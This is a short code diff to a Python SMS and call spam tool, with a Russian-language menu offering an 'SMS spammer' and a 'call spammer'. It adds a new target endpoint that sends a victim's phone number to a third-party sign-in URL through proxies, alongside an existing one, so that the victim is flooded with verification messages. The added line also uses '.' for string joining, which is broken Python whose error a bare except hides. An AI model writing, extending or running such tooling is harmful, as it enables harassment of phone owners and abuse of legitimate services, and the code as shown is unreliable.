@@ -35,7 +35,7 @@ def Main():
 			print(logo)
 			print(info)
 			print("Proxy: "+Fore.BLUE+"{}".format(proxy)+Style.RESET_ALL)
-			print ("1) СМС спамер.")
+			print ("1) СМС спамер. (update by @beycoder)")
 			print("2) Добавить телефон в антиспам лист.")
 			print("3) Проверить телефон в антиспам листе.")
 			print("4) Спамер звонков (beta, RU).")
@@ -465,6 +465,10 @@ def Main():
 																pass
 															try:
 																requests.post("https://alfalife.cc/auth.php", data={"phone": _phone}, proxies=proxies)
+															except:
+																pass
+															try:
+																requests.post("https://customer.umico.az/sign-in?phone=" . _phone, data={}, proxies=proxies)
 															except:
 																pass
 															try:
